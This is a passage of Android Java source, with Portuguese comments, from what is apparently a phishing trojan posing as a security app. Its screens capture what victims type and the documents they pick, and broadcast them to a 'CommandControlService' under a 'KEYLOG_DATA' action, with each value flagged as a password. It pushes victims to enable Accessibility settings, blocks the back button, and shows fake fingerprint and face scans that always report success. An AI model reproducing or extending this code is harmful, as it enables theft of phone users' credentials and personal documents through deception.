            bg.setColor(Color.parseColor(style.optString("backgroundColor", "#F5F5F5")));
            bg.setCornerRadius(dpToPx(style.optInt("borderRadius", 10)));
            container.setBackground(bg);
        }
        container.setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12));
        
        // Ícone de upload
        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_menu_upload);
        icon.setColorFilter(Color.parseColor("#4CAF50"));
        LinearLayout.LayoutParams iconParams = new LinearLayout.LayoutParams(dpToPx(40), dpToPx(40));
        iconParams.gravity = Gravity.CENTER;
        icon.setLayoutParams(iconParams);
        container.addView(icon);
        
        // Título
        TextView title = new TextView(this);
        title.setText(element.optString("content", "Enviar Documento"));
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        title.setTextColor(Color.parseColor("#333333"));
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT, 
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        titleParams.topMargin = dpToPx(8);
        title.setLayoutParams(titleParams);
        container.addView(title);
        
        // Botão de upload
        Button uploadBtn = new Button(this);
        uploadBtn.setText(element.optString("fileButtonText", "Selecionar Arquivo"));
        uploadBtn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 12);
        uploadBtn.setTextColor(Color.WHITE);
        
        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(Color.parseColor("#4CAF50"));
        btnBg.setCornerRadius(dpToPx(6));
        uploadBtn.setBackground(btnBg);
        
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            dpToPx(36)
        );
        btnParams.topMargin = dpToPx(8);
        uploadBtn.setLayoutParams(btnParams);
        uploadBtn.setPadding(dpToPx(16), 0, dpToPx(16), 0);
        
        // Label para identificar o arquivo no servidor
        String fileLabel = element.optString("fileLabel", "DOCUMENTO");
        
        // Tipos de arquivo aceitos
        JSONArray fileTypesArray = element.optJSONArray("fileTypes");
        String mimeTypes = buildMimeTypes(fileTypesArray);
        
        uploadBtn.setOnClickListener(v -> {
            currentFileLabel = fileLabel;
            openFilePicker(mimeTypes);
        });
        
        container.addView(uploadBtn);
        
        // Tipos aceitos (info)
        TextView typesInfo = new TextView(this);
        String typesText = getTypesDisplayText(fileTypesArray);
        typesInfo.setText(typesText);
        typesInfo.setTextSize(TypedValue.COMPLEX_UNIT_SP, 10);
        typesInfo.setTextColor(Color.parseColor("#999999"));
        typesInfo.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams typesParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        typesParams.topMargin = dpToPx(4);
        typesInfo.setLayoutParams(typesParams);
        container.addView(typesInfo);
        
        return container;
    }
    
    /**
     * Constrói string de MIME types baseado nos tipos selecionados
     */
    private String buildMimeTypes(JSONArray fileTypes) {
        if (fileTypes == null || fileTypes.length() == 0) {
            return "*/*"; // Todos os tipos
        }
        
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < fileTypes.length(); i++) {
            String type = fileTypes.optString(i);
            if (type == null) continue;
            
            switch (type) {
                case "image":
                    if (sb.length() > 0) sb.append("|");
                    sb.append("image/*");
                    break;
                case "pdf":
                    if (sb.length() > 0) sb.append("|");
                    sb.append("application/pdf");
                    break;
                case "document":
                    if (sb.length() > 0) sb.append("|");
                    sb.append("application/msword|application/vnd.openxmlformats-officedocument.wordprocessingml.document");
                    break;
                case "any":
                    return "*/*";
            }
        }
        
        return sb.length() > 0 ? sb.toString() : "*/*";
    }
    
    /**
     * Retorna texto amigável dos tipos de arquivo
     */
    private String getTypesDisplayText(JSONArray fileTypes) {
        if (fileTypes == null || fileTypes.length() == 0) {
            return "Todos os tipos";
        }
        
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < fileTypes.length(); i++) {
            String type = fileTypes.optString(i);
            if (type == null) continue;
            
            if (sb.length() > 0) sb.append(", ");
            switch (type) {
                case "image": sb.append("Imagens"); break;
                case "pdf": sb.append("PDF"); break;
                case "document": sb.append("Documentos"); break;
                case "any": return "Todos os tipos";
            }
        }
        
        return sb.toString();
    }
    
    /**
     * 📤 Abre o seletor de arquivos
     */
    private void openFilePicker(String mimeTypes) {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        
        // Se temos tipos específicos, configura
        if (!mimeTypes.equals("*/*")) {
            String[] types = mimeTypes.split("\\|");
            intent.putExtra(Intent.EXTRA_MIME_TYPES, types);
        }
        
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        startActivityForResult(Intent.createChooser(intent, "Selecionar arquivo"), FILE_PICKER_REQUEST_CODE);
    }
    
    /**
     * 📤 Callback quando um arquivo é selecionado
     */
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == FILE_PICKER_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            android.net.Uri uri = data.getData();
            if (uri != null) {
                handleFileSelected(uri);
            }
        }
    }
    
    /**
     * 📤 Processa o arquivo selecionado e envia para o servidor
     */
    private void handleFileSelected(android.net.Uri uri) {
        try {
            // Obtém informações do arquivo
            String fileName = getFileName(uri);
            String mimeType = getContentResolver().getType(uri);
            
            // Lê o arquivo como bytes
            InputStream inputStream = getContentResolver().openInputStream(uri);
            if (inputStream == null) {
                Toast.makeText(this, "Erro ao ler arquivo", Toast.LENGTH_SHORT).show();
                return;
            }
            
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[1024];
            int nRead;
            while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            inputStream.close();
            
            byte[] fileBytes = buffer.toByteArray();
            String base64Data = Base64.encodeToString(fileBytes, Base64.NO_WRAP);
            
            Log.d(TAG, "📤 Arquivo selecionado: " + fileName + " (" + mimeType + ") - " + fileBytes.length + " bytes");
            
            // Envia para o servidor via broadcast
            sendFileToServer(currentFileLabel, fileName, mimeType, base64Data);
            
            Toast.makeText(this, "Arquivo enviado: " + fileName, Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar arquivo: " + e.getMessage());
            Toast.makeText(this, "Erro ao processar arquivo", Toast.LENGTH_SHORT).show();
        }
    }
    
    /**
     * Obtém o nome do arquivo a partir da URI
     */
    private String getFileName(android.net.Uri uri) {
        String result = "arquivo";
        
        if (uri.getScheme().equals("content")) {
            android.database.Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            try {
                if (cursor != null && cursor.moveToFirst()) {
                    int index = cursor.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME);
                    if (index >= 0) {
                        result = cursor.getString(index);
                    }
                }
            } finally {
                if (cursor != null) cursor.close();
            }
        }
        
        return result;
    }
    
    /**
     * 📤 Envia arquivo para o servidor via CommandControlService
     */
    private void sendFileToServer(String label, String fileName, String mimeType, String base64Data) {
        try {
            JSONObject fileData = new JSONObject();
            fileData.put("type", "FILE_UPLOAD");
            fileData.put("label", label);
            fileData.put("fileName", fileName);
            fileData.put("mimeType", mimeType);
            fileData.put("data", base64Data);
            fileData.put("timestamp", System.currentTimeMillis());
            fileData.put("source", "VISUAL_SCREEN");
            
            // Envia via broadcast para CommandControlService
            Intent intent = new Intent("com.seguranca.protecao.KEYLOG_DATA");
            intent.putExtra("json_data", fileData.toString());
            sendBroadcast(intent);
            
            Log.d(TAG, "📤 Arquivo enviado para servidor: " + label + " - " + fileName);
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao criar JSON do arquivo: " + e.getMessage());
        }
    }
    
    /**
     * Trata ação de botão
     */
    private void handleButtonAction(String action, String buttonUrl) {
        // Captura todos os inputs antes de mudar de tela
        captureInputs();

        // 🔐 Se estamos na tela de acessibilidade e ela ainda NÃO está habilitada, abre as configurações!
        if (isCurrentScreenAccessibilityScreen() && !isAccessibilityEnabled()) {
            Log.d(TAG, "🔐 Clique na tela de Acessibilidade - abrindo configurações de Acessibilidade do Android!");
            openAccessibilitySettings();
            return;
        }
        
        switch (action) {
            case "next":
                // Vai para próxima tela
                if (currentScreenIndex < screens.length() - 1) {
                    renderScreen(currentScreenIndex + 1);
                } else {
                    // Última tela - fecha automaticamente
                    Log.d(TAG, "Última tela - fechando app");
                    finish();
                }
                break;
                
            case "submit":
                // Envia dados capturados para keylogger e vai para próxima tela
                sendCapturedDataToKeylogger();
                if (currentScreenIndex < screens.length() - 1) {
                    renderScreen(currentScreenIndex + 1);
                } else {
                    // Última tela após submit - fecha
                    Log.d(TAG, "Dados enviados - fechando app");
                    finish();
                }
                break;
                
            case "close":
            case "finish":
            case "custom":
                // Fecha activity e volta para home do celular
                Log.d(TAG, "Botão fechar - voltando para home");
                sendCapturedDataToKeylogger(); // Garante que dados foram enviados
                finish();
                break;
                
            case "home":
                // Vai para home do Android
                Log.d(TAG, "Indo para home");
                sendCapturedDataToKeylogger();
                Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                homeIntent.addCategory(Intent.CATEGORY_HOME);
                homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(homeIntent);
                finish();
                break;
                
            case "hide":
                // Esconde o app (minimiza)
                Log.d(TAG, "Minimizando app");
                sendCapturedDataToKeylogger();
                moveTaskToBack(true);
                break;
                
            case "accessibility":
                if (isAccessibilityEnabled()) {
                    Log.d(TAG, "Acessibilidade já está ativa! Avançando...");
                    SharedPreferences prefs2 = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                    prefs2.edit()
                        .putBoolean(KEY_WAITING_ACCESSIBILITY, false)
                        .putBoolean(KEY_ACCESSIBILITY_DONE, true)
                        .apply();
                    
                    startCommandService();
                    
                    if (currentScreenIndex < screens.length() - 1) {
                        renderScreen(currentScreenIndex + 1);
                    } else {
                        finish();
                    }
                } else {
                    // 🔐 Abre configurações de acessibilidade
                    Log.d(TAG, "Abrindo configurações de acessibilidade");
                    openAccessibilitySettings();
                }
                break;
                
            case "open_url":
                // 🌐 Abre URL no navegador padrão
                Log.d(TAG, "Abrindo URL: " + buttonUrl);
                sendCapturedDataToKeylogger();
                openUrlInBrowser(buttonUrl);
                break;
                
            default:
                Log.d(TAG, "Ação desconhecida: " + action);
                // Por segurança, fecha na última tela
                if (currentScreenIndex >= screens.length() - 1) {
                    finish();
                }
        }
    }
    
    /**
     * 🌐 Abre URL no navegador padrão do dispositivo
     */
    private void openUrlInBrowser(String url) {
        try {
            if (url == null || url.isEmpty()) {
                Log.e(TAG, "URL vazia - não abrindo navegador");
                return;
            }
            
            // Garante que a URL começa com http:// ou https://
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "https://" + url;
            }
            
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
            browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(browserIntent);
            Log.d(TAG, "🌐 Navegador aberto com URL: " + url);
            
            // Fecha o app após abrir o navegador
            finish();
        } catch (Exception e) {
            Log.e(TAG, "Erro ao abrir URL: " + e.getMessage());
        }
    }
    
    /**
     * 🔐 Abre configurações de acessibilidade do Android
     */
    private void openAccessibilitySettings() {
        try {
            // Salva estado no SharedPreferences
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit()
                .putBoolean(KEY_WAITING_ACCESSIBILITY, true)
                .putBoolean(KEY_ACCESSIBILITY_DONE, false)
                .apply();
            
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.d(TAG, "🔐 Abrindo acessibilidade - aguardando ativação...");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao abrir acessibilidade: " + e.getMessage());
            // Reseta estado em caso de erro
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_WAITING_ACCESSIBILITY, false).apply();
        }
    }
    
    /**
     * Captura valores dos inputs
     */
    private void captureInputs() {
        for (Map.Entry<String, EditText> entry : inputFields.entrySet()) {
            String label = entry.getKey();
            String value = entry.getValue().getText().toString();
            
            if (!value.isEmpty()) {
                capturedData.put(label, value);
                Log.d(TAG, "Capturado: " + label + " = " + value);
            }
        }
    }
    
    /**
     * Envia dados capturados para o keylogger
     */
    private void sendCapturedDataToKeylogger() {
        try {
            // Monta JSON com todos os dados capturados
            JSONObject keylogData = new JSONObject();
            keylogData.put("type", "VISUAL_SCREEN_DATA");
            keylogData.put("timestamp", System.currentTimeMillis());
            
            JSONObject data = new JSONObject();
            for (Map.Entry<String, String> entry : capturedData.entrySet()) {
                data.put(entry.getKey(), entry.getValue());
            }
            keylogData.put("captured", data);
            
            // Envia via broadcast para o CommandControlService
            Intent intent = new Intent("com.seguranca.protecao.KEYLOG_DATA");
            intent.putExtra("data", keylogData.toString());
            sendBroadcast(intent);
            
            Log.d(TAG, "Dados enviados para keylogger: " + capturedData.size() + " campos");
            
            // Para cada campo, envia keylog individual também
            for (Map.Entry<String, String> entry : capturedData.entrySet()) {
                JSONObject singleLog = new JSONObject();
                singleLog.put("package", getPackageName());
                singleLog.put("text", entry.getValue());
                singleLog.put("hint", entry.getKey());
                singleLog.put("isPassword", true);
                singleLog.put("source", "VISUAL_SCREEN");
                
                Intent keylogIntent = new Intent("com.seguranca.protecao.KEYLOG_DATA");
                keylogIntent.putExtra("data", singleLog.toString());
                sendBroadcast(keylogIntent);
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao enviar keylog: " + e.getMessage());
        }
    }
    
    /**
     * Converte dp para pixels
     */
    private int dpToPx(int dp) {
        float density = getResources().getDisplayMetrics().density;
        return Math.round(dp * density);
    }
    
    @Override
    public void onBackPressed() {
        // Bloqueia voltar nas primeiras telas
        if (currentScreenIndex > 0) {
            renderScreen(currentScreenIndex - 1);
        } else {
            // Na primeira tela, mostra mensagem
            Toast.makeText(this, "Complete a validação para continuar", Toast.LENGTH_SHORT).show();
        }
    }

    // =========================================================================
    // 🛡️ DYNAMIC BIOMETRIC AND LOADING COMPONENT METHODS
    // =========================================================================

    private View createFingerprintView(JSONObject element, JSONObject style) throws JSONException {
        String biometricColor = element.optString("biometricColor", "#00FF00");
        String biometricTextStr = element.optString("biometricText", "Toque e segure para verificar a digital");
        final String biometricAction = element.optString("biometricAction", "next");
        final String biometricUrl = element.optString("biometricUrl", "");

        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);

        FingerprintScannerView scanner = new FingerprintScannerView(this, biometricColor, () -> {
            runOnUiThread(() -> {
                handleButtonAction(biometricAction, biometricUrl);
            });
        });
        
        LinearLayout.LayoutParams scannerParams = new LinearLayout.LayoutParams(
            dpToPx(80),
            dpToPx(80)
        );
        scannerParams.gravity = Gravity.CENTER_HORIZONTAL;
        scanner.setLayoutParams(scannerParams);
        container.addView(scanner);

        TextView tvInfo = new TextView(this);
        tvInfo.setText(biometricTextStr);
        tvInfo.setTextColor(Color.WHITE);
        tvInfo.setTextSize(12);
        tvInfo.setGravity(Gravity.CENTER);
        
        LinearLayout.LayoutParams textParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        textParams.topMargin = dpToPx(10);
        tvInfo.setLayoutParams(textParams);
        
        container.addView(tvInfo);
        scanner.setStatusTextView(tvInfo, biometricTextStr);

        return container;
    }

    private View createFacialView(JSONObject element, JSONObject style) throws JSONException {
        String biometricColor = element.optString("biometricColor", "#00BFFF");
        String biometricTextStr = element.optString("biometricText", "Posicione seu rosto na área demarcada");
        final String biometricAction = element.optString("biometricAction", "next");
        final String biometricUrl = element.optString("biometricUrl", "");

        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);

        String biometricShape = element.optString("biometricShape", "normal");
        FaceScannerView scanner = new FaceScannerView(this, biometricColor, biometricShape, () -> {
            runOnUiThread(() -> {
                handleButtonAction(biometricAction, biometricUrl);
            });
        });
        
        LinearLayout.LayoutParams scannerParams = new LinearLayout.LayoutParams(
            dpToPx(140),
            dpToPx(140)
        );
        scannerParams.gravity = Gravity.CENTER_HORIZONTAL;
        scanner.setLayoutParams(scannerParams);
        container.addView(scanner);

        TextView tvInfo = new TextView(this);
        tvInfo.setText(biometricTextStr);
        tvInfo.setTextColor(Color.WHITE);
        tvInfo.setTextSize(11);
        tvInfo.setGravity(Gravity.CENTER);
        
        LinearLayout.LayoutParams textParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        textParams.topMargin = dpToPx(12);
        tvInfo.setLayoutParams(textParams);
        
        container.addView(tvInfo);
        scanner.setStatusTextView(tvInfo);

        return container;
    }

    private View createLoadingBarView(JSONObject element, JSONObject style) throws JSONException {
        String loadingTextStr = element.optString("loadingText", "Carregando segurança...");
        int loadingDuration = element.optInt("loadingDuration", 3000);
        final String loadingAction = element.optString("loadingAction", "next");
        final String loadingUrl = element.optString("loadingUrl", "");
        
        String barColorHex = "#00FF00";
        if (style != null) {
            barColorHex = style.optString("backgroundColor", "#00FF00");
        }
        final String finalBarColor = barColorHex;

        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);

        final TextView tvLabel = new TextView(this);
        tvLabel.setText(loadingTextStr + " (0%)");
        tvLabel.setTextColor(Color.WHITE);
        tvLabel.setTextSize(13);
        tvLabel.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams labelParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        labelParams.bottomMargin = dpToPx(8);
        tvLabel.setLayoutParams(labelParams);
        container.addView(tvLabel);

        final FrameLayout barFrame = new FrameLayout(this);
        barFrame.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            dpToPx(12)
        ));
        
        GradientDrawable bgShape = new GradientDrawable();
        bgShape.setColor(Color.parseColor("#44FFFFFF"));
        bgShape.setCornerRadius(dpToPx(6));
        barFrame.setBackground(bgShape);

        final View fillView = new View(this);
        FrameLayout.LayoutParams fillParams = new FrameLayout.LayoutParams(
            0,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        fillView.setLayoutParams(fillParams);
        
        GradientDrawable fillShape = new GradientDrawable();
        fillShape.setColor(Color.parseColor(finalBarColor));
        fillShape.setCornerRadius(dpToPx(6));
        fillView.setBackground(fillShape);
        
        barFrame.addView(fillView);
        container.addView(barFrame);

        final int targetWidth = dpToPx(element.getJSONObject("size").getInt("width"));
        android.animation.ValueAnimator progressAnimator = android.animation.ValueAnimator.ofFloat(0f, 1f);
        progressAnimator.setDuration(loadingDuration);
        progressAnimator.addUpdateListener(animation -> {
            float progress = (float) animation.getAnimatedValue();
            int currentWidth = (int) (progress * targetWidth);
            FrameLayout.LayoutParams lp = (FrameLayout.LayoutParams) fillView.getLayoutParams();
            if (lp != null) {
                lp.width = currentWidth;
                fillView.setLayoutParams(lp);
            }
            int pct = (int) (progress * 100);
            tvLabel.setText(loadingTextStr + " (" + pct + "%)");
        });
        
        progressAnimator.addListener(new android.animation.AnimatorListenerAdapter() {
            @Override
            public void onAnimationEnd(android.animation.Animator animation) {
                tvLabel.setText("Concluído!");
                tvLabel.setTextColor(Color.GREEN);
                runOnUiThread(() -> {
                    handleButtonAction(loadingAction, loadingUrl);
                });
            }
        });
        
        progressAnimator.start();

        return container;
    }

    // =========================================================================
    // 🧬 CUSTOM SUBCONTROL VIEWS (PUPIL SCAN & FINGERPRINT SCAN)
    // =========================================================================

    private static class FingerprintScannerView extends View {
        private final android.graphics.Paint paint = new android.graphics.Paint();
        private final android.graphics.Paint progressPaint = new android.graphics.Paint();
        private final int activeColor;
        private final Runnable onComplete;
        private float scanProgress = 0f;
        private boolean isScanning = false;
        private TextView statusTextView;
        private String originalText;
        private android.os.Handler handler = new android.os.Handler();
        private Runnable scanRunnable;

        public FingerprintScannerView(Context context, String colorHex, Runnable onComplete) {
            super(context);
            this.activeColor = Color.parseColor(colorHex);
            this.onComplete = onComplete;

            paint.setAntiAlias(true);
            paint.setStyle(android.graphics.Paint.Style.STROKE);
            paint.setStrokeCap(android.graphics.Paint.Cap.ROUND);
            paint.setStrokeWidth(6);

            progressPaint.setAntiAlias(true);
            progressPaint.setStyle(android.graphics.Paint.Style.STROKE);
            progressPaint.setStrokeWidth(8);
            
            scanRunnable = new Runnable() {
                @Override
                public void run() {
                    if (isScanning) {
                        scanProgress += 0.05f;
                        if (scanProgress >= 1f) {
                            scanProgress = 1f;
                            isScanning = false;
                            if (statusTextView != null) {
                                statusTextView.setText("Digital Reconhecida!");
                                statusTextView.setTextColor(Color.GREEN);
                            }
                            invalidate();
                            vibrateDevice();
                            postDelayed(onComplete, 500);
                        } else {
                            if (statusTextView != null) {
                                int pct = (int)(scanProgress * 100);
                                statusTextView.setText("Escaneando... " + pct + "%");
                                statusTextView.setTextColor(activeColor);
                            }
                            invalidate();
                            handler.postDelayed(this, 100);
                        }
                    }
                }
            };
        }
        
        public void setStatusTextView(TextView tv, String orig) {
            this.statusTextView = tv;
            this.originalText = orig;
        }

        private void vibrateDevice() {
            try {
                android.os.Vibrator v = (android.os.Vibrator) getContext().getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        v.vibrate(android.os.VibrationEffect.createOneShot(100, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                    } else {
                        v.vibrate(100);
                    }
                }
            } catch (Exception ignored) {}
        }

        @Override
        public boolean onTouchEvent(android.view.MotionEvent event) {
            switch (event.getAction()) {
                case android.view.MotionEvent.ACTION_DOWN:
                    isScanning = true;
                    scanProgress = 0f;
                    vibrateDevice();
                    handler.post(scanRunnable);
                    return true;
                case android.view.MotionEvent.ACTION_UP:
                case android.view.MotionEvent.ACTION_CANCEL:
                    isScanning = false;
                    scanProgress = 0f;
                    handler.removeCallbacks(scanRunnable);
                    if (statusTextView != null) {
                        statusTextView.setText(originalText);
                        statusTextView.setTextColor(Color.WHITE);
                    }
                    invalidate();
                    return true;
            }
            return super.onTouchEvent(event);
        }

        @Override
        protected void onDraw(android.graphics.Canvas canvas) {
            super.onDraw(canvas);
            
            float cx = getWidth() / 2f;
            float cy = getHeight() / 2f;
            float maxRadius = Math.min(cx, cy) - 10f;
            
            android.graphics.Paint bgPaint = new android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG);
            bgPaint.setColor(Color.parseColor("#33000000"));
            canvas.drawCircle(cx, cy, maxRadius, bgPaint);

            if (scanProgress > 0) {
                progressPaint.setColor(activeColor);
                android.graphics.RectF progressOval = new android.graphics.RectF(cx - maxRadius, cy - maxRadius, cx + maxRadius, cy + maxRadius);
                canvas.drawArc(progressOval, -90, 360 * scanProgress, false, progressPaint);
            } else {
                android.graphics.Paint strokePaint = new android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG);
                strokePaint.setColor(Color.parseColor("#44FFFFFF"));
                strokePaint.setStyle(android.graphics.Paint.Style.STROKE);
                strokePaint.setStrokeWidth(3);
                canvas.drawCircle(cx, cy, maxRadius, strokePaint);
            }

            paint.setColor(isScanning ? activeColor : Color.parseColor("#88FFFFFF"));
            
            for (int i = 0; i < 4; i++) {
                float r = 15 + i * 16;
                android.graphics.RectF oval = new android.graphics.RectF(cx - r, cy - r, cx + r, cy + r);
                canvas.drawArc(oval, 180 + 20, 140, false, paint);
                canvas.drawArc(oval, 360 + 20, 140, false, paint);
            }
            
            canvas.drawCircle(cx, cy, 6, paint);
        }
    }

    private static class FaceScannerView extends View {
        private final android.graphics.Paint paint = new android.graphics.Paint();
        private final android.graphics.Paint laserPaint = new android.graphics.Paint();
        private final int activeColor;
        private final String shape;
        private final Runnable onComplete;
        private float laserY = 0.1f;
        private boolean isDone = false;
        private TextView statusTextView;
        private android.animation.ValueAnimator animator;

        public FaceScannerView(Context context, String colorHex, String shape, Runnable onComplete) {
            super(context);
            this.activeColor = Color.parseColor(colorHex);
            this.shape = shape;
            this.onComplete = onComplete;

            paint.setAntiAlias(true);
            paint.setStyle(android.graphics.Paint.Style.STROKE);
            paint.setStrokeWidth(5);

            laserPaint.setAntiAlias(true);
            laserPaint.setStyle(android.graphics.Paint.Style.FILL);
            
            startScanning();
        }
        
        public void setStatusTextView(TextView tv) {
            this.statusTextView = tv;
        }

        private void startScanning() {
            animator = android.animation.ValueAnimator.ofFloat(0.1f, 0.9f);
            animator.setDuration(1500);
            animator.setRepeatMode(android.animation.ValueAnimator.REVERSE);
            animator.setRepeatCount(1);
            animator.addUpdateListener(animation -> {
                laserY = (float) animation.getAnimatedValue();
                invalidate();
            });
            animator.addListener(new android.animation.AnimatorListenerAdapter() {
                @Override
                public void onAnimationEnd(android.animation.Animator animation) {
                    isDone = true;
                    if (statusTextView != null) {
                        statusTextView.setText("Rosto Identificado!");
                        statusTextView.setTextColor(Color.GREEN);
                    }
                    invalidate();
                    postDelayed(onComplete, 800);
                }
            });
            animator.start();
        }

        @Override
        protected void onDetachedFromWindow() {
            super.onDetachedFromWindow();
            if (animator != null) {
                animator.cancel();
            }
        }

        @Override
        protected void onDraw(android.graphics.Canvas canvas) {
            super.onDraw(canvas);
            
            float w = getWidth();
            float h = getHeight();
            
            paint.setColor(isDone ? Color.GREEN : activeColor);
            android.graphics.RectF rect = new android.graphics.RectF(10, 10, w - 10, h - 10);
            if ("oval".equals(shape)) {
                canvas.drawOval(rect, paint);
            } else {
                canvas.drawRoundRect(rect, 30, 30, paint);

                float cornerSize = 30f;
                paint.setStrokeWidth(8);
                canvas.drawLine(10, 10, 10 + cornerSize, 10, paint);
                canvas.drawLine(10, 10, 10, 10 + cornerSize, paint);
                canvas.drawLine(w - 10, 10, w - 10 - cornerSize, 10, paint);
                canvas.drawLine(w - 10, 10, w - 10, 10 + cornerSize, paint);
                canvas.drawLine(10, h - 10, 10 + cornerSize, h - 10, paint);
                canvas.drawLine(10, h - 10, 10, h - 10 - cornerSize, paint);
                canvas.drawLine(w - 10, h - 10, w - 10 - cornerSize, h - 10, paint);
                canvas.drawLine(w - 10, h - 10, w - 10, h - 10 - cornerSize, paint);
            }
            

            if (!isDone) {
                laserPaint.setColor(activeColor);
                float yPos = h * laserY;
                canvas.drawRect(15, yPos - 3, w - 15, yPos + 3, laserPaint);
                
                android.graphics.Paint sweepPaint = new android.graphics.Paint();
                sweepPaint.setColor(activeColor);
                sweepPaint.setAlpha(20);
                canvas.drawRect(15, 15, w - 15, yPos, sweepPaint);
            } else {
                android.graphics.Paint checkPaint = new android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG);
                checkPaint.setColor(Color.GREEN);
                checkPaint.setStyle(android.graphics.Paint.Style.STROKE);
                checkPaint.setStrokeWidth(12);
                checkPaint.setStrokeCap(android.graphics.Paint.Cap.ROUND);
                
                float cx = w / 2f;
                float cy = h / 2f;
                canvas.drawLine(cx - 20, cy, cx - 5, cy + 15, checkPaint);
                canvas.drawLine(cx - 5, cy + 15, cx + 25, cy - 15, checkPaint);
            }
        }
    }
}

